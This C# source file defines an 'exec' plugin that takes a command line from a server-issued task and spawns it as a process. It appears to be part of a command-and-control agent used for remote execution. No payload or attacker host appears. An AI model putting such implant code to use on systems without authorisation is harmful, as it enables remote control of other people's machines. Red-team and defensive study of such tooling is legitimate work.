using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "exec";
        private IDataBroker messageManager { get; set; }
        private IRuntimeExecutor spawner { get; set; }

        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
            this.spawner = spawner;
        }

        public async Task Execute(ServerJob job)
        {
            ExecArgs args = JsonSerializer.Deserialize<ExecArgs>(job.task.parameters);

            if(args is null)
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Args is null",
                    completed = true
                });
                return;
            }

            if (string.IsNullOrEmpty(args.commandline))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Missing commandline",
                    completed = true
                });
                return;
            }

            if (await this.spawner.Spawn(args.getSpawnOptions(job.task.id)))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Process Spawned",
                    completed = true
                });
                return;
            }
        }
    }
}
